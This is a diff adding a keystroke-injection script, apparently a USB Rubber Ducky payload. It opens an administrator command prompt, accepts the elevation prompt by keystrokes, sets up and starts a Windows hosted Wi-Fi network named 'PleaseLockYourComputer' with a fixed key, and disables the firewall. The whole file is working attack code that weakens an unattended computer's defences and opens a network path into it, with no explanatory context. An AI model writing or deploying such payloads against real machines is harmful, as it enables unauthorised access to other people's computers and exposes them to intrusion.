@@ -1,0 +1,20 @@
+DELAY 2000
+CONTROL ESCAPE
+DELAY 200
+STRING cmd
+DELAY 200
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 200
+STRING netsh wlan set hostednetwork mode=allow ssid=PleaseLockYourComputer key=0123456789
+ENTER
+DELAY 100
+STRING netsh wlan start hostednetwork
+ENTER
+DELAY 100
+STRING netsh firewall set opmode disable
+ENTER
+STRING exit
+ENTER
